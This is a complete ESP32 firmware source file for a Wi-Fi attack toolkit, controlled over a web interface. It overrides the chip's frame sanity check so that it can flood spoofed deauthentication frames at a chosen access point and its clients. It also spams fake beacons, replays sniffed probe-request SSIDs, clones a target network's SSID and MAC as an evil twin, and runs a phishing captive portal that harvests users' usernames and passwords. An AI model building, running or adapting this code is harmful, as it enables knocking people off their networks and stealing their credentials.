#include <DNSServer.h>
#include <SPIFFS.h>
#include <WebServer.h>
#include <WiFi.h>
#include <algorithm>
#include <esp_wifi.h>
#include <vector>

using namespace std;

// ieee80211_raw_frame_sanity_check is called by esp_wifi_80211_tx() before
// transmitting a management frame. The default implementation rejects 0xC0
// (deauth) and 0xA0 (disassoc) subtypes. Overriding it to always return 0
// ("OK") lets esp_wifi_80211_tx() transmit ANY frame type- including deauth.
// This is the canonical bypass used by NetReaper, ESP32-Deauther, etc.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2,
                                                int32_t arg3) {
  return 0;
}

WebServer server(80);

// -- Wi-Fi Credentials --
const char *HOME_SSID = "ESP32-OST";
const char *HOME_PASS = "Password123";

// -- State Flags --
bool isProbing = false;
bool isGhostMode = false;
bool isBeaconSpamming = false;
bool isDeauthing = false;
bool isCaptivePortalActive = false;
unsigned long probeStartTime = 0;
unsigned long deauthStartTime = 0;

// -- Captive Portal Data --
struct Credential {
  String username;
  String password;
  String time;
};
vector<Credential> capturedCredentials;
DNSServer dnsServer;

// -- Target tracking --
uint8_t probe_bssid[6] = {0};
uint8_t deauth_bssid[6] = {0};
uint8_t deauth_client_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF,
                                0xFF, 0xFF}; // FF = broadcast (all clients)
int deauth_channel = 1;
String deauth_ssid = ""; // kept for serial logging only

// -- Collected data --
vector<String> detectedClients;
vector<String> ghostSSIDs;

// -- FreeRTOS task handles --
TaskHandle_t spamTask = NULL;
TaskHandle_t deauthTask = NULL;

// -- Spammer configs --
String spamPrefix = "Pwned_";
int spamCount = 30;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

void parseMac(String macStr, uint8_t *macBytes) {
  int bytes[6];
  sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &bytes[0], &bytes[1], &bytes[2],
         &bytes[3], &bytes[4], &bytes[5]);
  for (int i = 0; i < 6; i++)
    macBytes[i] = (uint8_t)bytes[i];
}

// ---------------------------------------------------------------------------
// Promiscuous sniffer callback
// ---------------------------------------------------------------------------

void IRAM_ATTR wifi_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *payload = pkt->payload;

  // ---- Ghost Mode: capture Probe Requests (0x40) ----
  if (isGhostMode && type == WIFI_PKT_MGMT) {
    if (payload[0] == 0x40) {
      uint8_t *body = payload + 24;
      if (body[0] == 0x00) {
        uint8_t ssid_len = body[1];
        if (ssid_len > 0 && ssid_len <= 32) {
          char ssid_buf[33] = {0};
          memcpy(ssid_buf, body + 2, ssid_len);
          String s = String(ssid_buf);

          bool valid = true;
          for (int i = 0; i < ssid_len; i++)
            if (ssid_buf[i] < 32 || ssid_buf[i] > 126)
              valid = false;

          if (valid && find(ghostSSIDs.begin(), ghostSSIDs.end(), s) ==
                           ghostSSIDs.end()) {
            ghostSSIDs.push_back(s);
            Serial.println("\n[GhostMode] Captured probe for: " + s);
          }
        }
      }
    }
  }

  // ---- Client Prober: capture client MACs around target AP ----
  if (!isProbing)
    return;

  if (type == WIFI_PKT_MGMT || type == WIFI_PKT_DATA) {
    uint8_t *addr1 = payload + 4;
    uint8_t *addr2 = payload + 10;

    bool fromAP = (memcmp(addr2, probe_bssid, 6) == 0);
    bool toAP = (memcmp(addr1, probe_bssid, 6) == 0);

    if (fromAP || toAP) {
      uint8_t *clientMac = fromAP ? addr1 : addr2;
      if (clientMac[0] & 0x01)
        return; // skip multicast

      char macStr[18];
      sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", clientMac[0],
              clientMac[1], clientMac[2], clientMac[3], clientMac[4],
              clientMac[5]);

      String m = String(macStr);
      if (find(detectedClients.begin(), detectedClients.end(), m) ==
          detectedClients.end()) {
        Serial.printf("\n[Prober] New client: %s\n", macStr);
        detectedClients.push_back(m);
      }
    }
  }
}

// ---------------------------------------------------------------------------
// Beacon frame injection
// ---------------------------------------------------------------------------

void send_beacon(const char *ssid, uint8_t *bssid, uint8_t channel) {
  uint8_t beacon[128] = {
      0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff,                         // dst: broadcast
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // src: bssid (filled below)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // bssid (filled below)
      0x00, 0x00,                         // seq
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // timestamp
      0x64, 0x00,                                     // beacon interval: 100 TU
      0x01, 0x04, // capability: ESS + Short Preamble
      0x00        // SSID tag id (filled below)
  };

  memcpy(&beacon[10], bssid, 6);
  memcpy(&beacon[16], bssid, 6);

  uint8_t len = strlen(ssid);
  beacon[37] = len;
  memcpy(&beacon[38], ssid, len);

  uint16_t idx = 38 + len;

  // Supported rates
  beacon[idx++] = 0x01;
  beacon[idx++] = 0x08;
  beacon[idx++] = 0x82;
  beacon[idx++] = 0x84;
  beacon[idx++] = 0x8b;
  beacon[idx++] = 0x96;
  beacon[idx++] = 0x0c;
  beacon[idx++] = 0x12;
  beacon[idx++] = 0x18;
  beacon[idx++] = 0x24;

  // DS parameter set
  beacon[idx++] = 0x03;
  beacon[idx++] = 0x01;
  beacon[idx++] = channel;

  esp_wifi_80211_tx(WIFI_IF_STA, beacon, idx, false);
}

// ---------------------------------------------------------------------------
// Deauth frame builder + sender
//
// ieee80211_raw_frame_sanity_check() (overridden above) makes
// esp_wifi_80211_tx() accept 0xC0 deauth frames without error.
//
// Frame layout (26 bytes, identical to NetReaper):
//   [0-1]   Frame Control : 0xC0 0x00  (management / deauthentication)
//   [2-3]   Duration      : 0x3A 0x01
//   [4-9]   Destination   : target client (or FF:FF:FF:FF:FF:FF for broadcast)
//   [10-15] Source        : AP BSSID  (spoofed- we pretend to BE the AP)
//   [16-21] BSSID         : AP BSSID
//   [22-23] Seq Control   : 0x00 0x00
//   [24-25] Reason Code   : 0x07 0x00  (Class 3 frame from nonassoc STA)
// ---------------------------------------------------------------------------

void send_deauth_frame(uint8_t *dst, uint8_t *ap_bssid) {
  uint8_t frame[26] = {
      0xC0, 0x00,                         // Frame Control: Deauthentication
      0x3A, 0x01,                         // Duration
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // DA  (filled below)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA  (filled below)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (filled below)
      0x00, 0x00,                         // Sequence Control
      0x07, 0x00 // Reason: Class 3 frame from nonassoc STA
  };
  memcpy(&frame[4], dst, 6);       // destination
  memcpy(&frame[10], ap_bssid, 6); // source  (spoofed as AP)
  memcpy(&frame[16], ap_bssid, 6); // bssid
  esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
}

void deauth_task_loop(void *pvParameters) {
  uint8_t ap[6], client[6];
  memcpy(ap, deauth_bssid, 6);
  memcpy(client, deauth_client_mac, 6);
  int ch = deauth_channel;

  static const uint8_t BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  bool broadcastMode = (memcmp(client, BROADCAST, 6) == 0);

  Serial.printf("\n[Deauth] Starting- target: %02X:%02X:%02X:%02X:%02X:%02X  "
                "AP: %02X:%02X:%02X:%02X:%02X:%02X  CH%d\n",
                client[0], client[1], client[2], client[3], client[4],
                client[5], ap[0], ap[1], ap[2], ap[3], ap[4], ap[5], ch);

  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

  while (isDeauthing) {
    // Always send broadcast deauth first (hits all clients on this AP)
    send_deauth_frame((uint8_t *)BROADCAST, ap);
    vTaskDelay(1 / portTICK_PERIOD_MS);

    if (!broadcastMode) {
      // Also send unicast directly to the specific target client:
      // Direction 1: AP→Client ("you are kicked")
      send_deauth_frame(client, ap);
      vTaskDelay(1 / portTICK_PERIOD_MS);
      // Direction 2: Client→AP ("I am leaving")- clears AP state table
      // Re-use the frame builder but swap src/dst
      uint8_t frame2[26] = {0xC0, 0x00, 0x3A, 0x01, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00,             // DA = AP
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA = client
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID = AP
                            0x00, 0x00, 0x07, 0x00};
      memcpy(&frame2[4], ap, 6);
      memcpy(&frame2[10], client, 6);
      memcpy(&frame2[16], ap, 6);
      esp_wifi_80211_tx(WIFI_IF_STA, frame2, sizeof(frame2), false);
      vTaskDelay(1 / portTICK_PERIOD_MS);
    }

    vTaskDelay(5 / portTICK_PERIOD_MS);
  }

  Serial.println("\n[Deauth] Stopped.");
  deauthTask = NULL;
  vTaskDelete(NULL);
}

// ---------------------------------------------------------------------------
// Beacon spam / Ghost mode FreeRTOS task
// ---------------------------------------------------------------------------

void spam_task_loop(void *pvParameters) {
  Serial.println("\n[Spammer] Task started.");
  while (isBeaconSpamming || isGhostMode) {
    if (isBeaconSpamming) {
      uint8_t bssid[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
      for (int i = 0; i < spamCount && isBeaconSpamming; i++) {
        bssid[5] = i % 255;
        bssid[4] = (i / 255) % 255;
        String ssid = spamPrefix + String(i);
        send_beacon(ssid.c_str(), bssid, 1);
        vTaskDelay(20 / portTICK_PERIOD_MS);
      }
    }

    if (isGhostMode && !ghostSSIDs.empty()) {
      uint8_t bssid[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
      for (size_t i = 0; i < ghostSSIDs.size() && isGhostMode; i++) {
        bssid[5] = i % 255;
        send_beacon(ghostSSIDs[i].c_str(), bssid, 1);
        vTaskDelay(20 / portTICK_PERIOD_MS);
      }
    }
    vTaskDelay(50 / portTICK_PERIOD_MS);
  }
  Serial.println("\n[Spammer] Task stopping.");
  spamTask = NULL;
  vTaskDelete(NULL);
}

// ---------------------------------------------------------------------------
// Network scan helpers
// ---------------------------------------------------------------------------

struct Network {
  String ssid;
  String bssid;
  int32_t rssi;
  int32_t channel;
  String encryption;
  String riskLevel;
};

vector<Network> networks;

String getEncryptionType(wifi_auth_mode_t type) {
  switch (type) {
  case WIFI_AUTH_OPEN:
    return "Open";
  case WIFI_AUTH_WEP:
    return "WEP";
  case WIFI_AUTH_WPA_PSK:
    return "WPA";
  case WIFI_AUTH_WPA2_PSK:
    return "WPA2";
  case WIFI_AUTH_WPA_WPA2_PSK:
    return "WPA/WPA2";
  default:
    return "Unknown";
  }
}

String classifyRisk(const String &enc) {
  if (enc == "Open" || enc == "WEP")
    return "HIGH";
  if (enc == "WPA" || enc == "WPA/WPA2")
    return "MEDIUM";
  if (enc == "WPA2")
    return "LOW";
  return "UNKNOWN";
}

void scanNetworks() {
  Serial.println("\n[Scanner] Initiating scan...");
  networks.clear();

  if (isProbing || isGhostMode) {
    Serial.println("[Scanner] Pausing promiscuous mode.");
    isProbing = false;
    esp_wifi_set_promiscuous(false);
  }

  int count = WiFi.scanNetworks(false, true);
  Serial.printf("[Scanner] Found %d networks.\n", count);
  if (count <= 0)
    return;

  for (int i = 0; i < count; i++) {
    Network net;
    net.ssid = WiFi.SSID(i);
    net.bssid = WiFi.BSSIDstr(i);
    net.rssi = WiFi.RSSI(i);
    net.channel = WiFi.channel(i);
    net.encryption = getEncryptionType(WiFi.encryptionType(i));
    net.riskLevel = classifyRisk(net.encryption);
    networks.push_back(net);
  }

  WiFi.scanDelete();
  sort(networks.begin(), networks.end(),
       [](const Network &a, const Network &b) { return a.rssi > b.rssi; });
}

// ---------------------------------------------------------------------------
// HTTP Handlers
// ---------------------------------------------------------------------------

void handleRoot() {
  File file = SPIFFS.open("/index.html", "r");
  if (!file) {
    server.send(500, "text/plain", "Failed to open index.html");
    return;
  }
  server.streamFile(file, "text/html");
  file.close();
}

void handleScan() {
  Serial.println("\n[HTTP] /scan");
  scanNetworks();
  String json = "[";
  for (size_t i = 0; i < networks.size(); i++) {
    json += "{";
    json += "\"ssid\":\"" + networks[i].ssid + "\",";
    json += "\"bssid\":\"" + networks[i].bssid + "\",";
    json += "\"rssi\":" + String(networks[i].rssi) + ",";
    json += "\"channel\":" + String(networks[i].channel) + ",";
    json += "\"encryption\":\"" + networks[i].encryption + "\",";
    json += "\"risk\":\"" + networks[i].riskLevel + "\"";
    json += "}";
    if (i < networks.size() - 1)
      json += ",";
  }
  json += "]";
  server.send(200, "application/json", json);
}

void handleSpoofStart() {
  if (server.hasArg("ssid") && server.hasArg("bssid") &&
      server.hasArg("channel")) {
    server.send(200, "text/plain", "Super Clone Active");
    server.client().flush();
    delay(50);

    String targetSsid = server.arg("ssid");
    int targetCh = server.arg("channel").toInt();
    uint8_t mac[6];
    parseMac(server.arg("bssid"), mac);

    Serial.printf("\n[Spoofer] Cloning '%s' on CH%d\n", targetSsid.c_str(),
                  targetCh);
    WiFi.softAPdisconnect(true);
    esp_wifi_set_mac(WIFI_IF_AP, mac);
    WiFi.softAP(targetSsid.c_str(), NULL, targetCh);
  } else {
    server.send(400, "text/plain", "Missing args");
  }
}

void handleSpoofStop() {
  server.send(200, "text/plain", "AP Stopped");
  server.client().flush();
  delay(50);

  Serial.println("\n[Spoofer] Stopping SoftAP...");
  WiFi.softAPdisconnect(true);
  WiFi.begin(HOME_SSID, HOME_PASS);
}

void handleProbeStart() {
  if (server.hasArg("bssid") && server.hasArg("channel")) {
    parseMac(server.arg("bssid"), probe_bssid);
    int ch = server.arg("channel").toInt();

    Serial.printf("\n[Prober] Probing %s on CH%d\n",
                  server.arg("bssid").c_str(), ch);
    detectedClients.clear();
    isProbing = true;
    probeStartTime = millis();

    server.send(200, "text/plain", "Probing");
    server.client().flush();
    delay(50);

    // Disable auto-reconnect and drop connection to tune radio properly
    WiFi.setAutoReconnect(false);
    WiFi.disconnect();
    delay(100);

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_cb);
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
  } else {
    server.send(400, "text/plain", "Missing args");
  }
}

void handleProbeResults() {
  String json = "[";
  for (size_t i = 0; i < detectedClients.size(); i++) {
    json += "\"" + detectedClients[i] + "\"";
    if (i < detectedClients.size() - 1)
      json += ",";
  }
  json += "]";
  server.send(200, "application/json", json);
}

void handleProbeStop() {
  Serial.println("\n[Prober] Stopping & Reconnecting...");
  isProbing = false;
  if (!isGhostMode)
    esp_wifi_set_promiscuous(false);

  WiFi.setAutoReconnect(true);
  WiFi.begin(HOME_SSID, HOME_PASS);
  server.send(200, "text/plain", "Stopped");
}

void handleSpamAction() {
  if (!server.hasArg("type") || !server.hasArg("state")) {
    server.send(400, "text/plain", "Missing args");
    return;
  }

  server.send(200, "text/plain", "OK");
  server.client().flush();
  delay(50);

  String type = server.arg("type");
  bool state = (server.arg("state") == "on");

  Serial.printf("\n[Spammer] type=%s state=%s\n", type.c_str(),
                state ? "ON" : "OFF");

  if (type == "beacon") {
    // Apply config if provided
    if (server.hasArg("prefix"))
      spamPrefix = server.arg("prefix");
    if (server.hasArg("count"))
      spamCount = server.arg("count").toInt();
    isBeaconSpamming = state;
  } else if (type == "ghost") {
    isGhostMode = state;
    if (state) {
      esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_cb);
      esp_wifi_set_promiscuous(true);
      Serial.println("[GhostMode] Promiscuous mode ON.");
    } else if (!isProbing) {
      esp_wifi_set_promiscuous(false);
      ghostSSIDs.clear();
    }
  }

  // Start spam/ghost task if needed and not already running
  if (state && spamTask == NULL && (isBeaconSpamming || isGhostMode)) {
    xTaskCreate(spam_task_loop, "spam", 4096, NULL, 5, &spamTask);
  }
}

void handleGhostResults() {
  String json = "[";
  for (size_t i = 0; i < ghostSSIDs.size(); i++) {
    json += "\"" + ghostSSIDs[i] + "\"";
    if (i < ghostSSIDs.size() - 1)
      json += ",";
  }
  json += "]";
  server.send(200, "application/json", json);
}

void handleGhostClear() {
  ghostSSIDs.clear();
  Serial.println("\n[GhostMode] SSIDs cleared.");
  server.send(200, "text/plain", "Cleared");
}

// ---------------------------------------------------------------------------
// Deauth handler – starts/stops the Evil-Twin flooding task
// ---------------------------------------------------------------------------

void handleDeauthStart() {
  if (!server.hasArg("bssid") || !server.hasArg("channel")) {
    server.send(400, "text/plain", "Missing bssid or channel");
    return;
  }

  parseMac(server.arg("bssid"), deauth_bssid);
  deauth_channel = server.arg("channel").toInt();
  deauth_ssid = server.hasArg("ssid") ? server.arg("ssid") : "";

  // Parse optional target client MAC; default = broadcast (hits all clients)
  if (server.hasArg("client")) {
    parseMac(server.arg("client"), deauth_client_mac);
  } else {
    memset(deauth_client_mac, 0xFF, 6); // broadcast
  }

  // Stop promiscuous mode- conflicts with AP-interface frame injection
  if (isProbing || isGhostMode) {
    Serial.println("[Deauth] Stopping promiscuous mode.");
    isProbing = false;
    esp_wifi_set_promiscuous(false);
  }

  Serial.printf(
      "\n[Deauth] Target client: %02X:%02X:%02X:%02X:%02X:%02X  AP: %s  CH%d\n",
      deauth_client_mac[0], deauth_client_mac[1], deauth_client_mac[2],
      deauth_client_mac[3], deauth_client_mac[4], deauth_client_mac[5],
      server.arg("bssid").c_str(), deauth_channel);

  if (isDeauthing) {
    isDeauthing = false;
    vTaskDelay(300 / portTICK_PERIOD_MS);
  }

  isDeauthing = true;
  deauthStartTime = millis();

  server.send(200, "text/plain", "Deauth started");
  server.client().flush();
  delay(50);

  // Disable auto-reconnect and drop connection for offline attack
  WiFi.setAutoReconnect(false);
  WiFi.disconnect();
  delay(100);

  xTaskCreate(deauth_task_loop, "deauth", 4096, NULL, 5, &deauthTask);
}

void handleDeauthStop() {
  Serial.println("\n[Deauth] Stop requested. Reconnecting...");
  isDeauthing = false;
  delay(100); // Allow task to exit
  WiFi.setAutoReconnect(true);
  WiFi.begin(HOME_SSID, HOME_PASS);
  server.send(200, "text/plain", "Deauth stopped");
}

void handleClearClients() {
  detectedClients.clear();
  Serial.println("\n[Prober] Client list cleared.");
  server.send(200, "text/plain", "Cleared");
}

// ---------------------------------------------------------------------------
// Captive Portal / Phishing Handlers
// ---------------------------------------------------------------------------

void handlePhishingStart() {
  if (!server.hasArg("ssid")) {
    server.send(400, "text/plain", "Missing ssid");
    return;
  }

  server.send(200, "text/plain", "Phishing Started");
  server.client().flush();
  delay(50);

  String targetSsid = server.arg("ssid");
  Serial.printf("\n[Phishing] Starting Captive Portal AP: '%s'\n",
                targetSsid.c_str());

  WiFi.softAP(targetSsid.c_str());

  // Start DNS Server to redirect all domains to the SoftAP IP
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(53, "*", WiFi.softAPIP());

  isCaptivePortalActive = true;
  capturedCredentials.clear();
}

void handlePhishingStop() {
  server.send(200, "text/plain", "Phishing Stopped");
  server.client().flush();
  delay(50);

  Serial.println("\n[Phishing] Stopping Captive Portal...");
  isCaptivePortalActive = false;
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.begin(HOME_SSID, HOME_PASS);
}

void handleLoginGet() {
  String html =
      "<!DOCTYPE html><html><head><meta name=\"viewport\" "
      "content=\"width=device-width, initial-scale=1\">"
      "<title>Wi-Fi Authentication</title><style>"
      "body{font-family:sans-serif;background:#f0f2f5;display:flex;justify-"
      "content:center;align-items:center;height:100vh;margin:0;}"
      ".box{background:white;padding:30px;border-radius:8px;box-shadow:0 4px "
      "12px rgba(0,0,0,0.1);width:90%;max-width:360px;text-align:center;}"
      "h2{margin-top:0;color:#1a73e8;}"
      "input{width:100%;padding:12px;margin:10px 0;border:1px solid "
      "#ccc;border-radius:4px;box-sizing:border-box;}"
      "button{width:100%;padding:12px;background:#1a73e8;color:white;border:"
      "none;border-radius:4px;font-size:16px;cursor:pointer;font-weight:bold;}"
      "</style></head><body>"
      "<div class=\"box\"><h2>Wi-Fi Authentication</h2><p>Please enter your "
      "credentials to access the internet.</p>"
      "<form action=\"/submit_login\" method=\"POST\">"
      "<input type=\"text\" name=\"username\" placeholder=\"Username / Email\" "
      "required>"
      "<input type=\"password\" name=\"password\" placeholder=\"Password\" "
      "required>"
      "<button type=\"submit\">Connect</button></form></div></body></html>";
  server.send(200, "text/html", html);
}

void handleSubmitLogin() {
  if (server.hasArg("username") && server.hasArg("password")) {
    Credential c;
    c.username = server.arg("username");
    c.password = server.arg("password");
    unsigned long ms = millis();
    c.time = String(ms / 60000) + "m " + String((ms % 60000) / 1000) + "s";
    capturedCredentials.push_back(c);
    Serial.printf("\n[Phishing] Captured! User: %s | Pass: %s\n",
                  c.username.c_str(), c.password.c_str());
  }

  String html =
      "<!DOCTYPE html><html><head><meta name=\"viewport\" "
      "content=\"width=device-width, "
      "initial-scale=1\"><title>Connecting...</title>"
      "<style>body{font-family:sans-serif;display:flex;justify-content:center;"
      "align-items:center;height:100vh;margin:0;background:#f0f2f5;}</style></"
      "head>"
      "<body><div "
      "style=\"text-align:center;\"><h2>Authenticating...</h2><p>Please wait "
      "while we verify your credentials.</p></div></body></html>";
  server.send(200, "text/html", html);
}

void handlePhishingResults() {
  String json = "[";
  for (size_t i = 0; i < capturedCredentials.size(); i++) {
    json += "{";
    json += "\"username\":\"" + capturedCredentials[i].username + "\",";
    json += "\"password\":\"" + capturedCredentials[i].password + "\",";
    json += "\"time\":\"" + capturedCredentials[i].time + "\"";
    json += "}";
    if (i < capturedCredentials.size() - 1)
      json += ",";
  }
  json += "]";
  server.send(200, "application/json", json);
}

void handlePhishingClear() {
  capturedCredentials.clear();
  server.send(200, "text/plain", "Cleared");
}

void handleNotFound() {
  if (isCaptivePortalActive) {
    server.sendHeader("Location",
                      String("http://") + WiFi.softAPIP().toString() + "/login",
                      true);
    server.send(302, "text/plain", "");
    return;
  }
  server.send(404, "text/plain", "Not found");
}

// ---------------------------------------------------------------------------
// Setup & Loop
// ---------------------------------------------------------------------------

void setup() {
  Serial.begin(115200);
  Serial.println("\n\n==========================================");
  Serial.println("[System] Booting ESP32-OST...");
  Serial.println("==========================================");

  esp_log_level_set("wifi", ESP_LOG_NONE);

  WiFi.mode(WIFI_AP_STA);
  WiFi.begin(HOME_SSID, HOME_PASS);

  Serial.print("[WiFi] Connecting.");
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println("\n[WiFi] Connected!");
  Serial.print("[WiFi] IP: ");
  Serial.println(WiFi.localIP());

  if (!SPIFFS.begin(true)) {
    Serial.println("[System] SPIFFS Mount Failed!");
    return;
  }
  Serial.println("[System] SPIFFS ready.");

  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/spoof_start", handleSpoofStart);
  server.on("/spoof_stop", handleSpoofStop);
  server.on("/probe_start", handleProbeStart);
  server.on("/probe_results", handleProbeResults);
  server.on("/probe_stop", handleProbeStop);
  server.on("/probe_clear", handleClearClients);
  server.on("/ghost_results", handleGhostResults);
  server.on("/ghost_clear", handleGhostClear);
  server.on("/ghost_clear", handleGhostClear);
  server.on("/spam", handleSpamAction);
  server.on("/deauth_start", handleDeauthStart);
  server.on("/deauth_stop", handleDeauthStop);

  server.on("/phishing_start", handlePhishingStart);
  server.on("/phishing_stop", handlePhishingStop);
  server.on("/login", HTTP_GET, handleLoginGet);
  server.on("/submit_login", HTTP_POST, handleSubmitLogin);
  server.on("/phishing_results", handlePhishingResults);
  server.on("/phishing_clear", handlePhishingClear);
  server.on("/ping", []() { server.send(200, "text/plain", "pong"); });
  server.onNotFound(handleNotFound);

  server.begin();
  Serial.println("[System] HTTP server started on port 80.\n");
}

void loop() {
  if (isCaptivePortalActive) {
    dnsServer.processNextRequest();
  }

  // Enforce 10s timeout on offline probe
  if (isProbing && (millis() - probeStartTime > 10000)) {
    Serial.println(
        "\n[Prober] 10s limit reached. Auto-stopping & Reconnecting...");
    isProbing = false;
    esp_wifi_set_promiscuous(false);
    WiFi.setAutoReconnect(true);
    WiFi.begin(HOME_SSID, HOME_PASS);
  }

  // Enforce 30s timeout on offline deauth
  if (isDeauthing && (millis() - deauthStartTime > 30000)) {
    Serial.println(
        "\n[Deauth] 30s limit reached. Auto-stopping & Reconnecting...");
    isDeauthing = false;
    delay(100); // Allow task to exit
    WiFi.setAutoReconnect(true);
    WiFi.begin(HOME_SSID, HOME_PASS);
  }

  server.handleClient();
}
